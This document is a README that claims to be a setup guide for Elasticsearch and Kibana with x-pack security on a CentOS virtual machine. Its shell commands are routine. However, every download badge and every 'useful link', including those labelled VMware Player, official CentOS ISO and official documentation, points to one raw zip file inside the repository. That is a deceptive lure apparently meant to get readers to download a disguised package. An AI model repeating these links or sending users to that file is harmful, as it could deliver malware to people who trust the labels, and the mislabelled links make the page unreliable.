# 🛠️ ElasticSearch_Kibana - Easy Setup for Search & Dashboards

[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip)

---

## 📋 About ElasticSearch_Kibana

This project guides you through setting up Elasticsearch and Kibana on a CentOS Linux virtual machine (VM) using VMware. The setup ensures security with x-pack features enabled. You will find step-by-step commands, troubleshooting tips, and a Jupyter notebook guide included.

Elasticsearch is a tool that helps you store and search through large amounts of data quickly. Kibana lets you view and explore that data using easy-to-read dashboards. Together, they help you find patterns, monitor systems, and analyze information efficiently.

This setup runs on CentOS, a popular Linux version, inside a VMware virtual machine. This guide works well for users who want to experiment safely inside their own PC before deploying on real servers.

---

## 🔎 Key Topics Covered

- Installing Elasticsearch and Kibana on CentOS-Stream
- Configuring x-pack security features for safer access
- Using VMware to create and run the CentOS VM
- Viewing data with Kibana dashboards
- Basic troubleshooting and tips for common errors
- Guided exploration with a Jupyter notebook

---

## 🖥️ System Requirements

Make sure your computer meets these minimum specs to run the VM and tools smoothly:

- Windows 10 or later
- At least 8 GB of RAM (16 GB recommended)
- 50 GB of free disk space for VM and software
- VMware Workstation Player or VMware Workstation Pro installed
- Internet connection for downloads and updates

---

## 🎯 What You Will Learn

By following this guide, you will:

- Create a CentOS VM using VMware on your Windows PC
- Install and start Elasticsearch and Kibana safely
- Set up x-pack security for controlled access
- Use Kibana to look at data through dashboards
- Solve common setup problems if they occur
- Explore data using Jupyter notebooks

This setup offers a great introduction to handling the ELK stack (Elasticsearch, Logstash, Kibana) with a focus on security.

---

## 🚀 Getting Started

Click the badge below to visit the release page and download the resources you need:

[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip)

1. Visit the [release page](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip).
2. Download the latest release package (usually a `.zip` or `.tar.gz` file).
3. Save the package somewhere easy to find, like your Desktop or Downloads folder.

---

## 💻 Setting Up Your CentOS VM

1. Install VMware Player or VMware Workstation if you don’t have it already. VMware is free for non-commercial use.
2. Open VMware and create a new virtual machine.
3. Choose the CentOS ISO image (you can download it from the official CentOS website).
4. Allocate at least 4 GB RAM and 20 GB disk space to the VM.
5. Start the VM and follow the on-screen instructions to install CentOS.
6. Once installed, update CentOS using the terminal with the command:
   ```
   sudo yum update
   ```

---

## ⚙️ Installing Elasticsearch & Kibana

1. Inside your VM terminal, download the Elasticsearch and Kibana packages from the official Elasticsearch site or use the packages provided in the release.
2. Install Elasticsearch by running:
   ```
   sudo rpm -ivh elasticsearch-<version>.rpm
   ```
3. Do the same for Kibana:
   ```
   sudo rpm -ivh kibana-<version>.rpm
   ```
4. Enable and start the Elasticsearch service:
   ```
   sudo systemctl enable elasticsearch
   sudo systemctl start elasticsearch
   ```
5. Enable and start Kibana:
   ```
   sudo systemctl enable kibana
   sudo systemctl start kibana
   ```

---

## 🔐 Configuring x-pack Security

The x-pack extension adds security features like user authentication and encryption.

1. Edit the Elasticsearch config file:
   ```
   sudo vi /etc/elasticsearch/elasticsearch.yml
   ```
2. Add or update these lines:
   ```
   xpack.security.enabled: true
   xpack.security.transport.ssl.enabled: true
   ```
3. Save and close the file.
4. Edit the Kibana config file:
   ```
   sudo vi /etc/kibana/kibana.yml
   ```
5. Add or update the following:
   ```
   elasticsearch.username: "kibana_system"
   elasticsearch.password: "<your_password>"
   ```
6. Restart both services to apply changes:
   ```
   sudo systemctl restart elasticsearch
   sudo systemctl restart kibana
   ```

---

## 📥 Download & Setup Summary

Use the link below again when you are ready to get all required files:

[Download the release here](https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip)

- Download the release package from the GitHub page.
- Install VMware if needed.
- Prepare a CentOS VM on your Windows PC.
- Install Elasticsearch and Kibana inside the VM.
- Enable and configure security with x-pack.
- Launch Kibana from your browser at `http://localhost:5601`.

---

## 🛠️ Troubleshooting Tips

- If Elasticsearch does not start, check logs in `/var/log/elasticsearch/`.
- Verify that your firewall allows access to ports 9200 (Elasticsearch) and 5601 (Kibana).
- If Kibana page does not load, make sure the Kibana service is running.
- Use the Jupyter notebook included in the release for further guided steps.
- If authentication fails, double-check the usernames and passwords in the config files.

---

## 📚 Using the Jupyter Notebook Guide

The repository includes a Jupyter notebook file that walks you through commands and concepts interactively.

1. Install Jupyter notebook on your VM or a local Python environment.
2. Open the notebook file from the released package.
3. Follow the steps inside the notebook for detailed commands and explanations.

---

## 🔗 Useful Links

- VMware Workstation Player: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip
- CentOS Official ISO Download: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip
- Elasticsearch Documentation: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip
- Kibana Documentation: https://github.com/LunartechTeam/ElasticSearch_Kibana/raw/refs/heads/main/technological/Kibana-Elastic-Search-2.0.zip

---

## 📂 Repository Topics

centos-stream, devops, elasticsearch, elk-stack, kibana, kibana-dashboard, linux-ubuntu, security, vmware, xpack